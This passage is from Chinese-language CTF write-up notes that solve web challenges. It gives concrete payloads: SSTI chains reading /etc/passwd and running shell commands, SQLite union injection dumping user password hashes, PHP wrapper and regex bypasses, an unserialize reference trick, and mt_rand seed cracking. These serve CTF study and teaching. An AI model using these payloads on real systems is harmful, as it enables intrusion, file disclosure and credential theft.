2. 虽然下面猜对了也可以出flag，但似乎没有漏洞点。其实利用点在:

   ```
   if (isset($_GET['source'])) {
     highlight_file(basename($_SERVER['PHP_SELF']));
     exit();
   }
   ```

   但是前面还有过滤：

   ```
   if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
     exit("I don't know what you are thinking, but I won't let you read it :)");
   }
   ```

3. 其中`$_SERVER['PHP_SELF']`我们知道它的值是url相对路径。也就是说我们输入`/index.php/config.php?source` 会返回`/index.php/config.php`

4. 我们知道`preg_match` 是需要完全匹配才会返回true的，也就是说我们输入`/index.php/config.php/a`就可以绕过，但是basename的结果会是`a`显然会报错，因为没这个文件。此时我们想到了basename会忽略一些奇怪的字符`%80 ~ %ff`。

5. 所以我们输入`/index.php/comfig.php/%ff` 就可以进行显示comfig.php文件，这里所有的操作都是在index.php下进行的（我们看到的代码都是index.php的代码）。当然我们不要忘记传get的变量source。

6. payload：`/index.php/config.php/%81?source`
   [![img](CTF.assets/5eb89ffbc2a9a83be53b48cb.jpg)](https://pic.downk.cc/item/5eb89ffbc2a9a83be53b48cb.jpg)

## 攻防世界 Confusion1

这题主要考点的模板注入，且里面做了大量的关键字过滤，绕过方法是：`request.args.a`或者使用`['__cla+ss__']`

这里主要记录一个`File`类的文件读取

```
http://61.147.171.105:59629/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read

正常payload： 假设 40 为子类 File
{{''.__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
```

**使用`[]`就不需要使用`.`**

## 攻防世界 FlatScience

查看`robots.txt`文件可以看到提示网站

![image-20240125184543219](CTF.assets/image-20240125184543219.png)

查看`/admin.php`的注释说的是，不要尝试对这个页面进行绕过

<img src="CTF.assets/image-20240125184637145.png" alt="image-20240125184637145" style="zoom:50%;" />

查看`/login.php`注释，提示加上一个`debug`参数，

![image-20240125184932836](CTF.assets/image-20240125184932836.png)

在第8行确实存在SQL注入漏洞，但是这里用的是：`sqlite`数据库而不是`mysql`数据库，所以注入的payload会有所不同

```php
<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
```

### 1，什么是sqlite数据库：

SQLite的是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite的本身是Ç写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的应用中使用。

SQLite是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。它是一个零配置的数据库，这意味着与其他数据库一样，您不需要在系统中配置。

就像其他数据库，SQLite 引擎不是一个独立的进程，可以按应用程序需求进行静态或动态连接。SQLite 直接访问其存储文件。

### 2，sqlite和 mysql的不同：

熟悉MySQL数据库的人都知道，MySQL中有一个名为information_schema的系统库，里面包含了所有MYSQL数据库中库名，表名，列名的信息，那么SQLITE数据库有没有呢？
答案当然是没有的。对于SQLITE而言，并没有库的概念，而是直接对象就是表了，所以SQLITE没有系统库，但是它是存在系统表的，这个表名为sqlite_master

简单来说，SQLITE功能简约，小型化，追求最大磁盘效率；MYSQL功能全面，综合化，追求最大并发效率。如果只是单机上用的，数据量不是很大，需要方便移植或者需要频繁读/写磁盘文件的话，就用SQLite比较合适；如果是要满足多用户同时访问，或者是网站访问量比较大是使用MYSQL比较合适。
**sqlite是没有数据库的概念的，直接面向的是多张数据表**

<img src="CTF.assets/image-20240125185234616.png" alt="image-20240125185234616" style="zoom:80%;" />

这里经过测试，union联合注入是可用的，那么按照上面的提示照着填就 可以了

```
爆表：
123'+union+select+1,group_concat(tbl_name)+from+sqlite_master+where+type='table'--+

爆字段：
usr=123'+union+select+1,sql+from+sqlite_master+where+type='table'+and+tbl_name='Users'--+&pw=123

托库：
usr=123'+union+select+1,group_concat(name)+from+Users--+&pw=123
```

这里说一下啊，读源码可以看到，PHP会将`name`字段的值写入`cookie`中，那么回显位就在cookie上面

![image-20240125185555632](CTF.assets/image-20240125185555632.png)

最后得到的结果如下：

```
表结构：
CREATE+TABLE+Users(id+int+primary+key,name+varchar(255),password+varchar(255),hint+varchar(255))

username：admin,fritze,hansi

password：3fab54a50e770d830c0416df817567662a9dc85c,54eae8935c90f467427f05e4ece82cf569f89507,34b0bb7c304949f9ff2fc101eef0f048be10d3bd

hint：my fav word in my fav paper? !,my love is…?, the password is password;
```

在源码上面可以知道，密码的加密方法：`sha1($pass."Salz!")`，解密方法是：将上面的所有pdf文件下载下来并计算逐个单词，以`单词+Salz！`做sha1哈希然后与数据库得到的`admin`哈希做对比，一致则正确

## BUUOJ [GYCTF2020]FlaskApp

这题有点好彩，然后看了一下网上的wp，也没找到跟我的做法一样的

首先抓包，题目名和`title`都提示了`Flask`，那么基本上可以确定是SSTI注入了，然后接下来是寻找注入点，由于太菜了一开始没找到，喵了一眼发现注入点就在这，然后就是测试了

![image-20240127003930087](CTF.assets/image-20240127003930087.png)

在这之前，要先说一下，通过抓包可以看到返回了Session字段，那么这里也要把Session伪造考虑进去的。（其实是将解码的结果传给`$_SESSION[message]`，前端再通过`$_SESSION[message]`拿到数据），后面解码之后就可以看到了

由于一开始传入`{{7*7}`返回的是`no no no`，所以以为的是把`{}`做了屏蔽，其实这里屏蔽的是`*`，`{{7+7}}`是可以的，然后翻了一下葵花宝典，一开始用的是`{% if true %} 123 {% endif %}`成功！，但是最后直接就拿`{% print() %}`来传入payload了

然后就是走流程了，这里用的模块一样是`Subprocess.popen`来做的，要说一下的是：`{% print(''.__class__.__base__.subclasses__()) %}`这里可能返回的信息太多了，导致前端没有渲染出来，但是在HTTP的Session中是有记录的，直接解码Session就好

<img src="CTF.assets/image-20240127004724994.png" alt="image-20240127004724994" style="zoom:50%;" />

最后的RCE发现对`flag`也是做了过滤的，翻了一下葵花宝典，也是用`$@`绕过去了，最后flag

```
{% print(''.__class__.__base__.__subclasses__()[286]('cat /this_is_the_fl$@ag.txt',shell=True,stdout=-1).communicate()[0].strip()) %}

base64编码：
eyUgcHJpbnQoJycuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKClbMjg2XSgnY2F0IC90aGlzX2lzX3RoZV9mbCRAYWcudHh0JyxzaGVsbD1UcnVlLHN0ZG91dD0tMSkuY29tbXVuaWNhdGUoKVswXS5zdHJpcCgpKSAlfQ==
```

## BUUOJ [MRCTF2020]套娃

进入查看源码获得第一个关代码

```php
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

```
$_SERVER['QUERY_STRING']：获得 GET 请求的所有键值对

第一个绕过点：如果 $_GET 请求种带有 _ 就返回 die()
绕过：%5F, 空格			PHP 会自动将 GET请求 中的空格视为下划线

第二个绕过点：preg_match() %0a绕过，$不会校验行尾的换行

payload：?b u p t=23333%0a
```

![image-20240130004428067](CTF.assets/image-20240130004428067.png)

查看`secrettw.php`的源码，拿到下一条线索

![image-20240130004512802](CTF.assets/image-20240130004512802.png)

**New Bing解答：**JSFuck是一种基于JavaScript的编程风格，只使用六个不同的字符：`(`, `)`, `[`, `]`, `!` 和 `+`。这种编码方式虽然难以阅读，但是它可以在所有JavaScript环境中运行。

解析 JSFuck 代码有几种方法：

1. **使用浏览器的控制台**：你可以在浏览器（如 Google Chrome 或 Firefox）的开发者工具中的控制台输入 JSFuck 代码，然后按回车键执行。这种方法的优点是简单快捷，但可能需要一些 JavaScript 基础知识。
2. **使用在线工具**：有一些在线工具可以帮助你解析 JSFuck 代码

直接使用控制台运行这段代码！

![image-20240130004721326](CTF.assets/image-20240130004721326.png)

POST 提交拿到关键源码

<img src="CTF.assets/image-20240130004807555.png" alt="image-20240130004807555" style="zoom:50%;" />

```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```

首先，要求`$ip=127.0.0.1`，由于`getIP()`方法没给出来，那就只能试了，最后使用`Client-ip: 127.0.0.1`成功绕过（`Client-ip`的请求不能使用Hackbar发送，可能是因为Hackbar并没有准备Client-ip的相关字段方法）

**网络上常见的请求头**
       1、`X-Forwarded-For`
X-Forwarded-For 是一个 HTTP 扩展头部。

HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入。

如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用。只有在通过了 HTTP 代理或者负载均衡服务器时才会添加该项。

X-Forwarded-For 请求头格式非常简单：

`X-Forwarded-For: client, proxy1, proxy2`

一般情况下，第一个ip为客户端真实ip，后面的为经过的代理服务器ip。

2、Proxy-Client-IP
这个一般是经过apache http服务器的请求才会有，用apache http做代理时一般会加上Proxy-Client-IP请求头，而WL- Proxy-Client-IP是他的

3、WL- Proxy-Client-IP
weblogic插件加上的请求头头

4、HTTP_CLIENT_IP
有些代理服务器会加上此请求头

5、X-Real-IP
nginx代理一般会加上此请求头

`file_get_contents($_GET['2333']) === 'todat is a happy day'`这个判断的绕过就要使用PHP伪协议来做了，翻找一下那张图片，只要是能让用户控制输入流的就可以做到`php://input data://`

`file_get_contents(change($_GET['file']));`最后计算出来的结果必须为：`flag.php`，从上面的代码逆回来

```php
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
```

1. base64 解码
2. 逐个取出字符，打成ASCII码，然后`+ $i*2`，再转成字符
3. 返回整个字符串

关键点就在第二步，将`+`变成`-`就好了，逆向计算脚本如下：

```php
# flag.php
function change($v){
    $v = base64_decode($v);
    var_dump($v);
    $re = '';
    for($i=0;$i<strlen($v);$i++){
        var_dump(ord($v[$i]), $i*2);
        $re .= chr ( ord ($v[$i]) - $i*2 );
        var_dump($re);
    }
    return $re;
}

$src = 'ZmxhZy5waHA=';      # flag.php
var_dump(base64_encode(change($src)));
```

最后附上完整的HTTP报文

![image-20240130010012561](CTF.assets/image-20240130010012561.png)

## BUUOJ [GWCTF 2019]枯燥的抽奖

### 1. PHP 伪随机数

**mt_rand()函数**

> mt_rand() 函数使用 Mersenne Twister 算法生成随机整数。
> 使用语法：mt_rand(); or mt_rand(min,max);，生成一个区间内的随机数。
> 其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_getrandmax()函数获得。

**mt_srand()函数**

> mt_srand() 函数播种 Mersenne Twister 随机数生成器。
> 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。

在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点，我们先看两个例子。

```php
<?PHP
mt_srand(0);
echo mt_rand();
echo mt_rand();
echo mt_rand();
?>
```


在上面的代码中，我们把随机数播种为0，每次运行都会获得相同的序列，这就是伪随机：

```php
963932192
1273124119
1535857466
```


当我们去掉mt_srand()函数时，再次重复运行实例，系统会自动为rand函数播种，但也是播种一次。因此多次重复运行的结果也相同，为：

```
992978829
928748101
1380702626
```


**因此在知晓一串随机序列的条件下，基于序列相同的seed爆破就是可能实现的。**

### 2. 解题

进去读一下JS源码能看到一段AJAX代码，跟着这段AJAX代码访问`check.php`就能看到源码

`rand()`函数生成 随机种子 并写入`$_SESSION`，后续根据这个种子生成随机数

```php
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

**随机数爆破**

先使用PHP编写程序把给出的部分字符串处理成脚本需要的数据格式，程序源码如下：

```
<?php
error_reporting(0);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$string='tsD5SzCFpA';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
$pos=strpos($str_long1,$string[$i]);
    echo $pos." ".$pos." 0 61 " ;  
}
?>
```

传入脚本执行得出种子。

[![image-20220323192922686](CTF.assets/2293037-20220323212633978-1181329822.png)](https://img2022.cnblogs.com/blog/2293037/202203/2293037-20220323212633978-1181329822.png)

生成完整字符串的代码从check.php中截取就ok，将获得的种子传入拿到完整的字符串。

[![image-20220323193051796](CTF.assets/2293037-20220323212633632-2109253090.png)](https://img2022.cnblogs.com/blog/2293037/202203/2293037-20220323212633632-2109253090.png)

flag，在初始页面源码中可以看到存在另外一校验页面check.php。

[![image-20220323191656856](CTF.assets/2293037-20220323212634843-16914972.png)](https://img2022.cnblogs.com/blog/2293037/202203/2293037-20220323212634843-16914972.png)

[![image-20220323191613173](CTF.assets/2293037-20220323212634323-1067662591.png)](https://img2022.cnblogs.com/blog/2293037/202203/2293037-20220323212634323-1067662591.png)

访问后直接给出了check.php的源码：

```
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

可以注意到我们猜测字符串是采用伪随机函数依据种子生成的，所以我们可以利用脚本通过给出的部分字符串逆推出伪随机函数采用的种子（这里脚本采用的是php_mt_seed）。

先使用PHP编写程序把给出的部分字符串处理成脚本需要的数据格式，程序源码如下：

```
<?php
error_reporting(0);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$string='tsD5SzCFpA';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
$pos=strpos($str_long1,$string[$i]);
    echo $pos." ".$pos." 0 61 " ;  
}
?>
```

传入脚本执行得出种子。

[![image-20220323192922686](CTF.assets/2293037-20220323212633978-1181329822-17066224997537.png)](https://img2022.cnblogs.com/blog/2293037/202203/2293037-20220323212633978-1181329822.png)

生成完整字符串的代码从check.php中截取就ok，将获得的种子传入拿到完整的字符串。

[![image-20220323193051796](CTF.assets/2293037-20220323212633632-2109253090-17066224997539.png)](https://img2022.cnblogs.com/blog/2293037/202203/2293037-20220323212633632-2109253090.png)

生成完整字符串的源码（注意PHP版本要符合脚本中给出的版本）

**有点很奇怪的是，我用PHP8和PHP5跑出来的结果并不一样，且只有PHP5的结果能爆破出种子**

## `require_once` 绕过

由于在代码的第三行已经使用了`require_once`包含了`flag.php`，那么在第五行的时候再次尝试包含`flag.php`就会失败

```php
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

这里直接给出payload：

`/proc/self/root`：指向当前进程的根路径

```
file=php://filter/read=convert.base64-encode/resource=file:///proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/flag.php
```

具体是为什么可以参考：https://www.anquanke.com/post/id/213235#h3-3

## `$GLOBALS` 超全局变量

`$GLOBALS`：获取全局作用域中可用的全部变量

```php
<meta charset="UTF-8" />
<?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
```

payload:

```
?args=GLOBALS

$args = GLOBALS
$$args = $GLOBALS
```

## PHP中引用的特性

**提示：**PHP中引用的用法，将`$o->enter`设置为`$o->secret`的引用，这样更改`$o->secret`时`$o->enter`也会随之更改

```php
<?php
#GOAL: get the secret;
class just4fun {
    var $enter;
    var $secret;
}
if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];
    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }
    $o = unserialize($pass);
    if ($o) {
        $o->secret = "flag{I'm xxxxxxxxxxxxxxxxxxxxxxxxxxxx}";
        if ($o->secret === $o->enter)
         echo "Congratulation! Here is my secret: ".$o->secret;
        else
         echo "Oh no... You can't fool me";
    }
    else echo "are you trolling?";
}
?>
```

- `if(get_magic_quotes_gpc()){...}`：这是一个条件判断，用于检查 PHP 的 `magic_quotes_gpc` 配置是否开启。如果开启，那么 `get_magic_quotes_gpc()` 的值为 `true`，否则为 `false`。`magic_quotes_gpc` 是一个已经废弃的 PHP 配置选项，如果开启，那么所有的 `GET`、`POST` 和 `COOKIE` 数据都会自动进行转义，即在所有的单引号、双引号、反斜线和 `NULL` 字符前面自动添加反斜线。
- `$pass=stripslashes($pass);`：如果 `magic_quotes_gpc` 配置开启，那么这行代码会移除 `$pass` 中的转义字符。`stripslashes()` 是一个 PHP 函数，用于移除字符串中的转义字符。

```
payload：

$j = new just4fun();
$j->enter = &$j->secret;
echo urlencode(serialize($j));

O%3A8%3A%22just4fun%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BN%3Bs%3A5%3A%22enter%22%3BR%3A2%3B%
```

## 伪协议-Lv2（考点：伪协议data读取文件）

```php
<?php
highlight_file('index.php');
echo "Null          ...            Null            ...            Null          ...  ";

if(isset($_GET['src'])) {
    die(highlight_file('index.php', true));
}

error_reporting(0);
if($_REQUEST){
    foreach ($_REQUEST as $key => $value) {
        if(preg_match('/[a-zA-Z]/i', $value))   die('Hello Hack.');
    }
}
 
if($_SERVER){
    if(preg_match('/cyber|flag|ciscn/i', $_SERVER['QUERY_STRING']))  die('Hello Hack..');
}
 
if(isset($_GET['cyber'])){
    if(!(substr($_GET['cyber'], 32) === md5($_GET['cyber']))){ 
        die('Hello Hack...');
    }else{
        if(preg_match('/^ciscnsec$/', $_GET['ciscn']) && $_GET['ciscn'] !== 'ciscnsec'){
            $getflag = file_get_contents($_GET['flag']);
        }else
    die('Hello Hack....');
        if(isset($getflag) && $getflag === 'security'){
            include 'flag.php';
            echo $flag;
        }else die('Hello Hack.....');
    }
}
?>
```

这里的源码中，有三个`if`语句要绕过，我们先看最后的`if`语句

```php
if(!(substr($_GET['cyber'], 32) === md5($_GET['cyber'])))
    # var_dump(substr('123', 32)); 		# 当传入的字符串不够长的时候，返回 false
    # md5 计算数组返回false
    # 得：cyber[] = 123
    
if(preg_match('/^ciscnsec$/', $_GET['ciscn']) && $_GET['ciscn'] !== 'ciscnsec')
    # 很常见的一个CTF考点，利用 $ 允许字符串最后有一个 \n 的特性，使用 %0A 绕过
    # 得：ciscn = ciscnsec%0A
    
if(isset($getflag) && $getflag === 'security')
    # 回溯：$getflag = file_get_contents($_GET['flag']);
    # 很明显就是用伪协议控制输入流，使 $getflag=security，php://input 和 data://text/plain 都试一下
    # 得：data://text/plain;base64,c2VjdXJpdHk=
```

再看第一个`if`语句：

**$_REQUEST有一个特性，当GET和POST有相同的变量时，匹配POST的变量，那么就可以同时传参GET和POST即可**，那么直接使用$_POST传值覆盖$_GET

```php
# 遍历 $_GET 和 $_REQUEST 键值对，如果其中有英文字符就die
if($_REQUEST){
    foreach ($_REQUEST as $key => $value) {
        if(preg_match('/[a-zA-Z]/i', $value))   die('Hello Hack.');
    }
}
```

最后看第二个`if`语句

**`$_SERVER['QUERY_STRING']`，用于获取当前请求的查询字符串部分。查询字符串是位于 URL 中 ? 符号之后的部分，包含了以键值对形式传递的参数。所以我们可以url编码绕过即可**

那么只要将传入的参数中带有`/cyber|flag|ciscn`都做一个URL编码即可

```php
if($_SERVER){
    if(preg_match('/cyber|flag|ciscn/i', $_SERVER['QUERY_STRING']))  die('Hello Hack..');
}
```

```
payload：
GET传参：
?%63%69%73%63%6E=%63%69%73%63%6Esec%0a
&%63%79%62%65%72[]=123
&%66%6C%61%67=data://text/plain;base64,c2VjdXJpdHk=

POST传参：
ciscn=123&cyber=123&flag=123
```

![image-20240203222446559](CTF.assets/image-20240203222446559.png)

## ereg函数特性

利用ereg%00绕过的特性 `aaaa%00*-*` 绕过

```php
<?php 
highlight_file('index.php');
include('flag.php');
if (isset ($_GET['password'])) 
{
  # password必须只包含保护数字和字母
  if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
  {
    echo '<p>You password must be alphanumeric</p>';
  }
  else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
   {
     # 密码中必须包含*-*
     if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置
      {
      die('Flag: ' . $flag);
      }
      else
      {
        echo('<p>*-* have not been found</p>'); 
       }
      }
     else 
     {
        echo '<p>Invalid password</p>'; 
      }
   } 
?>
```

```
payload：password=9e9%00*-*
```

## 文件包含

```php
<?php error_reporting(0);
if(isset($_GET['c']))
{ 
    $c = $_GET['c'];
    if(!preg_match("/flag|system|exec|shell|php|\.| |\'|\`|echo|\;|\(/i", $c))
    { 
        eval($c); 
    }
}
else
{
     highlight_file(__FILE__); 
}
```

payload：

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

知识点：**include可以不用括号，分号可以用?>代替**

## ASCII码绕过检测

```php
<?php
include('flag.php');
 highlight_file(__FILE__);
 error_reporting(0);
 function filter($num)
 {
     $num=str_replace("0x","1",$num);
     $num=str_replace("0","1",$num);
     $num=str_replace(".","1",$num);
     $num=str_replace("e","1",$num);
     $num=str_replace("+","1",$num);
     return $num; 
 } $num=$_GET['num'];
 if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36')
 {
    if($num=='36')
    {
        echo $flag;
    }
    else
    {
        echo "hacker!!";
    } 
 }
 else
 {
     echo "hacker!!!"; 
 }
?>
```

POC 代码

```php
<?php 
for($i = 0; $i<129; $i++)
{
     $num=chr($i).'36';
     if(trim($num)!=='36' && is_numeric($num) && $num!=='36')
     {
        echo urlencode(chr($i))."\n"; 
     } 
 } 
?>
```

```
urldecode('%0C36')`会被解码为字符串`"\f36"`。当这个字符串在与数字比较时，PHP会尝试将这个字符串转换为数字。在这个转换过程中，PHP会从字符串的开始处读取，直到遇到一个不能被解析为数字的字符。在这个例子中，`\f`（对应于ASCII的换页符）不能被解析为数字，所以它被忽略，剩下的`"36"`被解析为数字36。因此，`urldecode('%0C36') == 36`的结果为`true
```

## strcmp() 函数漏洞

> 注：这一个漏洞适用与5.3之前版本的php

```php
<?php
$flag = "flag{xxxxx}";
if (isset($_GET['a'])) {
if (strcmp($_GET['a'], $flag) == 0) 
die('Flag: '.$flag);
else
print 'No';
}
?>
```

使用GET方法获取参数a，使用strcmp()函数比较`$flag`与用户输入的值。

传入的期望类型是字符串类型的数据 ，但是这个函数当接受到不符合字符串类型的参数就会发生错误，并返回0

所以我们只需要提交一个非字符串类型的参数即可使得判断条件成立，比如使用数组类型

解题方法：

GET请求：?a[]=2

因为strcmp()无法比较数组，则报错并返回0，0==0成立，则输出flag。

## call_user_func()函数 数组调用

### 说明

call_user_func ( [callable](language.types.callable.html) `$callback` [, [mixed](language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](language.pseudo-types.html#language.types.mixed)

第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。

### 参数

- `callback`

  将被调用的回调函数（[callable](language.types.callable.html)）。

- `parameter`

  0个或以上的参数，被传入回调函数。

```php
<?php
error_reporting(E_ALL);
function increment(&$var)
{
    $var++;
}

$a = 0;
call_user_func('increment', $a);
echo $a."\n";

call_user_func_array('increment', array(&$a)); // You can use this instead before PHP 5.3
echo $a."\n";
?>
```

### 例题

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class hello {
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}
if(strripos($_POST['hello'], ":")>-1){
    die("private function");
}
call_user_func($_POST['hello']);
```

`array[0]=$classname` 类名
		`array[1]=say_hello` say_hello()方法
		`call_user_func`函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。

```
payload：hello[0]=hello&hello[1]=getFlag
```

## PHP 反射类

PHP反射API由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。 反射API是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。

我们用的比较多的是 ReflectionClass类、ReflectionObject 和ReflectionMethod类，

ReflectionClass 通过类名获取类的信息；

ReflectionObject 通过类的对象获取类的信息；

ReflectionMethod 获取一个方法的有关信息。

### 示例

```php
<?php

class  Printer
{
}

class  Student
{
    private $name;
    private $year;

    public function __construct($name, $year)
    {
        $this->name = $name;
        $this->year = $year;
    }

    public function getValue()
    {
        return $this->name;
    }

    public function setBase(Printer $printer, $name, $year = 10)
    {
        $this->name = $name;
        $this->year = $year;
    }
}

echo new ReflectionClass('Student');

# 输出：
Class [ <user> class Student ] {
  @@ D:\PHP\test3.php 7-28

  - Constants [0] {
  }

  - Static properties [0] {
  }

  - Static methods [0] {
  }

  - Properties [2] {
    Property [ <default> private $name ]
    Property [ <default> private $year ]
  }

  - Methods [3] {
    Method [ <user, ctor> public method __construct ] {
      @@ D:\PHP\test3.php 12 - 16

      - Parameters [2] {
        Parameter #0 [ <required> $name ]
        Parameter #1 [ <required> $year ]
      }
    }

    Method [ <user> public method getValue ] {
      @@ D:\PHP\test3.php 18 - 21
    }

    Method [ <user> public method setBase ] {
      @@ D:\PHP\test3.php 23 - 27

      - Parameters [3] {
        Parameter #0 [ <required> Printer $printer ]
        Parameter #1 [ <required> $name ]
        Parameter #2 [ <optional> $year = 10 ]
      }
    }
  }
}
```

### 例题

由于`=`的优先级比`and`更高，所以只要保证`$v1=1`就可以绕过

根据上面可知，`ReflectionClass` 通过类名获取类的信息；`ReflectionObject` 通过类的对象获取类的信息；那么就在这两个类上面做文章，最后得到下面的payload

```php
<?php
highlight_file(__FILE__);
include ("flag.php");
$flag = new flag();
$v1 = $_GET['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if ($v0) {
    if (!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)) {
        if (!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)) {
            eval("$v2('flag')$v3");
        }
    }
} 
?>
```

```
payload：v1=123&v2=echo new ReflectionClass&v3=;
```

## PHP 内置类

> 参考链接：https://blog.csdn.net/qq_63701832/article/details/131166789

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['v1']) && isset($_GET['v2'])) {
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if (preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)) {
        die("error v1");
    }
